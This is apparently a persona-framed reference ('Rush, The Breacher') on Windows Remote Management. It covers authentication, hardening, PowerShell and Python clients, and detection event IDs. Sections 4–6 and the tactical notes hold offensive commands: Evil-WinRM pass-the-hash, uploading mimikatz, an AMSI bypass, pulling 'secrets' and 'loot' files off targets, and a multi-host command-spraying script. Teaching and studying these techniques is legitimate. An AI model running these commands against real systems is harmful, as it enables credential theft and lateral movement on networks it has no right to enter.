# GS-26: WinRM Remoting — Windows Remote Management Deep Dive

**Classification**: Rush (Royal Guard — The Breacher)
**Seed ID**: GS-26
**Domain**: Remote Access / Windows Infrastructure
**Source**: Microsoft WinRM Documentation, MITRE ATT&CK T1021.006

---

## 1. WinRM Architecture Overview

Windows Remote Management (WinRM) is Microsoft's implementation of the WS-Management protocol — a SOAP-based, firewall-friendly protocol for managing systems remotely. It is the backbone of PowerShell Remoting, and one of the most powerful lateral movement vectors in any Windows environment.

### Core Components

| Component | Role |
|---|---|
| **WinRM Service** | Listener daemon on the target (winrm.exe / svchost.exe) |
| **WSMan Provider** | PowerShell provider that interfaces with WinRM |
| **WMI Plugin** | Allows WMI queries over WinRM |
| **HTTP.sys** | Kernel-mode HTTP driver that handles transport |
| **WinRS** | Windows Remote Shell — cmd-level remote execution |

### Transport Ports

| Port | Protocol | Encryption | Default State |
|---|---|---|---|
| **5985** | HTTP | Message-level encryption (not TLS) | Enabled on servers |
| **5986** | HTTPS | TLS + message-level encryption | Disabled by default |
| **80** | HTTP (compatibility) | Message-level | Legacy, rarely used |
| **443** | HTTPS (compatibility) | TLS | Legacy, rarely used |

**Critical understanding**: HTTP on 5985 does NOT mean unencrypted. WinRM encrypts the SOAP payload by default using Kerberos or NTLM session keys. The wire traffic is encrypted even over HTTP. HTTPS adds TLS on top — certificate validation, transport-level encryption, and protection against MITM downgrade attacks.

### How a WinRM Session Works

```
Client                          Target (5985/5986)
  |                                    |
  |--- HTTP POST /wsman ------------->|  (SOAP envelope)
  |    Authorization: Negotiate       |  (SPNEGO token)
  |                                    |
  |<-- 401 + WWW-Authenticate --------|  (Challenge)
  |                                    |
  |--- HTTP POST /wsman ------------->|  (SPNEGO response + encrypted SOAP)
  |    Authorization: Negotiate       |
  |                                    |
  |<-- 200 OK + Shell ID -------------|  (Session established)
  |                                    |
  |--- Command execution over SOAP -->|
  |<-- Encrypted results -------------|
```

---

## 2. Authentication Mechanisms

### Kerberos (Default in Domain Environments)

Kerberos is the preferred and strongest authentication method for WinRM in Active Directory environments.

**How it works with WinRM**:
1. Client obtains a TGT from the KDC (Domain Controller)
2. Client requests a service ticket for `HTTP/target.domain.com`
3. Service ticket is embedded in the SPNEGO token in the HTTP Authorization header
4. Target validates the ticket — no password ever crosses the wire
5. Session key from the ticket encrypts all subsequent SOAP traffic

**Requirements**:
- Both client and target must be domain-joined
- DNS must resolve the target FQDN correctly (Kerberos is hostname-sensitive)
- Clock skew must be within 5 minutes (default tolerance)
- SPN `HTTP/hostname` must exist (auto-registered by WinRM service)

**SPN Verification**:
```powershell
# Check SPNs registered for a computer
setspn -L TARGET-HOSTNAME

# Look for HTTP/ SPNs specifically
setspn -L TARGET-HOSTNAME | findstr "HTTP/"

# If missing, register manually (requires domain admin)
setspn -A HTTP/target.domain.com TARGET-HOSTNAME
```

### NTLM (Fallback / Workgroup)

NTLM is the fallback when Kerberos is unavailable — workgroup environments, IP-based connections, or cross-forest without trust.

**How it works with WinRM**:
1. Client sends a Type 1 (Negotiate) message
2. Server responds with Type 2 (Challenge) — 8-byte nonce
3. Client computes NTLMv2 response using password hash + challenge + timestamp
4. Server validates against SAM or forwards to DC (pass-through auth)
5. Session key derived from the exchange encrypts SOAP traffic

**Security concerns**:
- NTLMv2 responses can be captured and cracked offline (Responder, ntlmrelayx)
- No mutual authentication — client cannot verify server identity
- Relay attacks possible if signing is not enforced
- Subject to pass-the-hash if attacker has the NT hash

### CredSSP (Credential Security Support Provider)

CredSSP delegates the user's full credentials to the target server. This enables "double hop" — the target can authenticate to a third system on your behalf.

**When you need CredSSP**:
- Accessing a file share from a remote session (double hop)
- Running commands that need to authenticate to another server
- Any scenario where Kerberos delegation isn't configured

**Setup on the client**:
```powershell
# Enable CredSSP client role
Enable-WSManCredSSP -Role Client -DelegateComputer "*.domain.com"

# Or specific targets
Enable-WSManCredSSP -Role Client -DelegateComputer "server01.domain.com"

# Verify
Get-WSManCredSSP
```

**Setup on the server (target)**:
```powershell
# Enable CredSSP server role
Enable-WSManCredSSP -Role Server
```

**Group Policy (preferred for domain-wide)**:
```
Computer Configuration → Administrative Templates → System → Credentials Delegation
→ Allow delegating fresh credentials → Enabled
→ Add servers: WSMAN/*.domain.com
```

**Security warning**: CredSSP sends your actual password (encrypted) to the target. If the target is compromised, your credentials are exposed. Use Kerberos Constrained Delegation (KCD) or Resource-Based KCD instead when possible.

### Certificate-Based Authentication

Maps an X.509 certificate to a local account — no password needed.

```powershell
# Create a client certificate mapping on the target
$cert = Get-ChildItem Cert:\LocalMachine\Root | Where-Object {$_.Subject -eq "CN=ClientCert"}

New-Item -Path WSMan:\localhost\ClientCertificate `
    -Subject "user@domain.com" `
    -URI * `
    -Issuer $cert.Thumbprint `
    -Credential (Get-Credential)
```

---

## 3. One-Time Admin Setup (Server Side)

### Enable and Configure WinRM

```powershell
# Quick enable — creates HTTP listener, sets firewall rules, starts service
winrm quickconfig

# Or via PowerShell (same effect)
Enable-PSRemoting -Force

# Verify listeners
winrm enumerate winrm/config/listener

# Check current configuration
winrm get winrm/config
winrm get winrm/config/service
winrm get winrm/config/client
```

### Configure HTTPS Listener

```powershell
# Step 1: Create or obtain a certificate (self-signed for lab)
$cert = New-SelfSignedCertificate -DnsName "server01.domain.com" `
    -CertStoreLocation Cert:\LocalMachine\My `
    -NotAfter (Get-Date).AddYears(5)

# Step 2: Create HTTPS listener
New-WSManInstance -ResourceURI winrm/config/Listener `
    -SelectorSet @{Address="*"; Transport="HTTPS"} `
    -ValueSet @{CertificateThumbprint=$cert.Thumbprint}

# Step 3: Firewall rule
New-NetFirewallRule -DisplayName "WinRM HTTPS" `
    -Direction Inbound -LocalPort 5986 -Protocol TCP -Action Allow

# Verify
winrm enumerate winrm/config/listener
```

### TrustedHosts Configuration

TrustedHosts is the safety valve for NTLM connections. When you connect to a machine by IP or a non-domain hostname, WinRM refuses by default because it cannot use Kerberos and cannot verify the server's identity.

```powershell
# View current TrustedHosts
Get-Item WSMan:\localhost\Client\TrustedHosts

# Add specific hosts (comma-separated)
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "192.168.1.100,192.168.1.101"

# Add a subnet pattern
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "192.168.1.*"

# Add ALL (lab only — never in production)
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "*"

# Append without overwriting
$current = (Get-Item WSMan:\localhost\Client\TrustedHosts).Value
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "$current,newhost"
```

**What TrustedHosts actually does**: It tells the client "I accept the risk of NTLM auth to these targets without verifying their identity." It does NOT grant access — it just suppresses the client-side safety check.

### Service Hardening

```powershell
# Restrict to HTTPS only (disable HTTP listener)
Remove-WSManInstance -ResourceURI winrm/config/Listener `
    -SelectorSet @{Address="*"; Transport="HTTP"}

# Limit max connections
winrm set winrm/config/service @{MaxConnections=25}

# Enforce encryption (default is true — verify it)
winrm set winrm/config/service @{AllowUnencrypted="false"}

# Set max memory per shell (MB)
winrm set winrm/config/winrs @{MaxMemoryPerShellMB=1024}

# IP filter — only allow specific subnets
winrm set winrm/config/service @{IPv4Filter="192.168.1.0/24"}
```

---

## 4. Client-Side Connection Examples

### PowerShell Remoting

```powershell
# Interactive session (Kerberos — domain)
Enter-PSSession -ComputerName server01.domain.com

# Interactive session (NTLM — workgroup/IP)
$cred = Get-Credential
Enter-PSSession -ComputerName 192.168.1.100 -Credential $cred

# Interactive session (HTTPS + skip cert check for self-signed)
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck
Enter-PSSession -ComputerName server01 -UseSSL -SessionOption $so -Credential $cred

# Run command on multiple targets
Invoke-Command -ComputerName server01,server02,server03 -ScriptBlock {
    Get-Service | Where-Object {$_.Status -eq "Running"} | Select-Object Name, DisplayName
} -Credential $cred

# Persistent session (reuse for multiple commands)
$session = New-PSSession -ComputerName server01 -Credential $cred
Invoke-Command -Session $session -ScriptBlock { hostname }
Invoke-Command -Session $session -ScriptBlock { whoami /priv }
Remove-PSSession $session

# Copy files over WinRM
$session = New-PSSession -ComputerName server01 -Credential $cred
Copy-Item -Path "C:\local\payload.exe" -Destination "C:\temp\" -ToSession $session
Copy-Item -Path "C:\remote\loot.zip" -Destination "C:\local\" -FromSession $session

# CredSSP double-hop
Enter-PSSession -ComputerName server01 -Credential $cred -Authentication CredSSP
```

### WinRS (Windows Remote Shell)

```cmd
:: Basic command execution
winrs -r:server01 hostname
winrs -r:server01 -u:DOMAIN\user -p:Password123 ipconfig /all

:: HTTPS
winrs -r:https://server01:5986 -u:admin -p:Pass123 whoami

:: Interactive shell
winrs -r:server01 cmd.exe
```

---

## 5. Evil-WinRM from Kali Linux

Evil-WinRM is the go-to tool for WinRM access from Linux attack platforms.

### Installation

```bash
# From gem (recommended)
gem install evil-winrm

# Or from source
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
bundle install
```

### Connection Methods

```bash
# Basic password auth (NTLM over HTTP)
evil-winrm -i 10.10.10.100 -u administrator -p 'Password123!'

# Pass-the-hash (NT hash only — no LM needed)
evil-winrm -i 10.10.10.100 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'

# HTTPS with self-signed cert
evil-winrm -i 10.10.10.100 -u admin -p 'Pass123' -S

# With custom port
evil-winrm -i 10.10.10.100 -u admin -p 'Pass123' -P 5986 -S

# Load PowerShell scripts on connect
evil-winrm -i 10.10.10.100 -u admin -p 'Pass123' -s /opt/scripts/

# Load C# binaries for in-memory execution
evil-winrm -i 10.10.10.100 -u admin -p 'Pass123' -e /opt/binaries/
```

### Evil-WinRM In-Session Commands

```ruby
# Upload/download files
upload /tmp/mimikatz.exe C:\temp\mimikatz.exe
download C:\Users\admin\Desktop\secrets.txt /tmp/secrets.txt

# Load and execute PowerShell scripts (from -s path)
Bypass-4MSI                          # Attempt AMSI bypass
menu                                  # Show all commands

# Execute .NET assemblies in memory (from -e path)
Invoke-Binary /opt/Rubeus.exe        # Loads and runs in-memory

# Services enumeration
services

# Command history
history
```

---

## 6. pywinrm — Python WinRM Client

### Installation

```bash
pip install pywinrm
# For Kerberos support
pip install pywinrm[kerberos]
# For CredSSP
pip install pywinrm[credssp]
```

### Basic Usage

```python
import winrm

# NTLM authentication (most common for pen testing)
session = winrm.Session(
    'http://10.10.10.100:5985/wsman',
    auth=('DOMAIN\\administrator', 'Password123!'),
    transport='ntlm'
)

# Execute command
result = session.run_cmd('whoami /all')
print(f"Status: {result.status_code}")
print(f"Output: {result.std_out.decode()}")
print(f"Errors: {result.std_err.decode()}")

# Execute PowerShell
result = session.run_ps('Get-Process | Sort-Object CPU -Descending | Select-Object -First 10')
print(result.std_out.decode())
```

### Advanced pywinrm Patterns

```python
import winrm
from winrm.protocol import Protocol

# Low-level protocol access (more control)
p = Protocol(
    endpoint='https://10.10.10.100:5986/wsman',
    transport='ntlm',
    username='DOMAIN\\admin',
    password='Password123!',
    server_cert_validation='ignore'  # Self-signed certs
)

shell_id = p.open_shell()
command_id = p.run_command(shell_id, 'ipconfig', ['/all'])
std_out, std_err, status_code = p.get_command_output(shell_id, command_id)
p.cleanup_command(shell_id, command_id)
p.close_shell(shell_id)

print(std_out.decode())
```

### Kerberos with pywinrm

```python
import winrm

# Requires valid krb5.conf and a TGT (kinit first)
session = winrm.Session(
    'http://dc01.domain.com:5985/wsman',
    auth=('user@DOMAIN.COM', ''),  # Empty password — uses TGT
    transport='kerberos',
    kerberos_delegation=True  # Enable if double-hop needed
)

result = session.run_ps('Get-ADUser -Filter * | Select-Object Name, Enabled')
print(result.std_out.decode())
```

### Multi-Target Execution Script

```python
#!/usr/bin/env python3
"""Rush's WinRM multi-target executor."""

import winrm
import concurrent.futures
from dataclasses import dataclass

@dataclass
class Target:
    host: str
    username: str
    password: str
    domain: str = ""
    port: int = 5985
    ssl: bool = False

def execute_on_target(target: Target, command: str, powershell: bool = False):
    """Execute a command on a single target via WinRM."""
    scheme = "https" if target.ssl else "http"
    port = target.port or (5986 if target.ssl else 5985)
    endpoint = f"{scheme}://{target.host}:{port}/wsman"

    auth_user = f"{target.domain}\\{target.username}" if target.domain else target.username

    try:
        session = winrm.Session(
            endpoint,
            auth=(auth_user, target.password),
            transport='ntlm',
            server_cert_validation='ignore' if target.ssl else 'validate'
        )

        if powershell:
            result = session.run_ps(command)
        else:
            result = session.run_cmd(command)

        return {
            'host': target.host,
            'status': result.status_code,
            'stdout': result.std_out.decode('utf-8', errors='replace'),
            'stderr': result.std_err.decode('utf-8', errors='replace'),
            'success': True
        }
    except Exception as e:
        return {
            'host': target.host,
            'status': -1,
            'stdout': '',
            'stderr': str(e),
            'success': False
        }

def spray_command(targets: list[Target], command: str, powershell: bool = False, max_workers: int = 10):
    """Execute a command across multiple targets in parallel."""
    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {
            executor.submit(execute_on_target, t, command, powershell): t
            for t in targets
        }
        for future in concurrent.futures.as_completed(futures):
            results.append(future.result())
    return results

# Usage
if __name__ == "__main__":
    targets = [
        Target("10.10.10.100", "admin", "Pass123!", "CORP"),
        Target("10.10.10.101", "admin", "Pass123!", "CORP"),
        Target("10.10.10.102", "admin", "Pass123!", "CORP"),
    ]

    results = spray_command(targets, "Get-LocalGroupMember -Group Administrators", powershell=True)
    for r in results:
        print(f"\n{'='*60}")
        print(f"Host: {r['host']} | Status: {r['status']} | Success: {r['success']}")
        print(r['stdout'])
```

---

## 7. Detection and Defensive Awareness

### Event Logs to Monitor

| Event ID | Log | Meaning |
|---|---|---|
| **4624** (Type 3) | Security | Network logon via WinRM |
| **4648** | Security | Explicit credential use (CredSSP) |
| **91** | Microsoft-Windows-WinRM/Operational | WinRM session created |
| **161** | Microsoft-Windows-WinRM/Operational | Authentication failure |
| **6** | Microsoft-Windows-WinRM/Operational | WSMan session initialized |
| **169** | Microsoft-Windows-WinRM/Operational | User authenticated successfully |

### PowerShell Script Block Logging (catches commands run over WinRM)

```powershell
# Event ID 4104 in Microsoft-Windows-PowerShell/Operational
# Enable via GPO:
# Computer Config → Admin Templates → Windows Components → Windows PowerShell
# → Turn on PowerShell Script Block Logging → Enabled
```

### Network Indicators

```
# WinRM traffic patterns on the wire
POST /wsman HTTP/1.1
Content-Type: application/soap+xml;charset=UTF-8
Authorization: Negotiate <base64 token>

# Default User-Agent
User-Agent: Microsoft WinRM Client
```

---

## 8. Rush's Tactical Notes

1. **Always try 5985 first** — it's enabled by default on Windows Server 2012+ with `Enable-PSRemoting`. Port 5986 requires extra cert setup.

2. **IP vs hostname matters** — connecting by IP forces NTLM (no Kerberos). In a domain, always use FQDN for Kerberos and to avoid TrustedHosts issues.

3. **WinRM is a gateway drug** — once you have WinRM access, you can load any PowerShell tool: Mimikatz, BloodHound's SharpHound, Rubeus, PowerView. Evil-WinRM's `-s` and `-e` flags make this trivial.

4. **Double-hop is your wall** — standard WinRM sessions cannot authenticate to third systems. Solutions: CredSSP (risky), Kerberos delegation (proper), or just upload tools and run locally.

5. **JEA (Just Enough Administration)** — if you hit a JEA-constrained endpoint, you're in a restricted runspace. Enumerate what's available with `Get-Command`. Breakout is possible if the role capability file is misconfigured.

6. **Every route, every network** — WinRM works over standard HTTP/HTTPS. It traverses proxies, can be tunneled through SSH (`ssh -L 5985:target:5985 jumpbox`), and works through port forwards. If you can get TCP to 5985/5986, you can get a shell.

---

*Rush doesn't knock. Rush is already inside.*
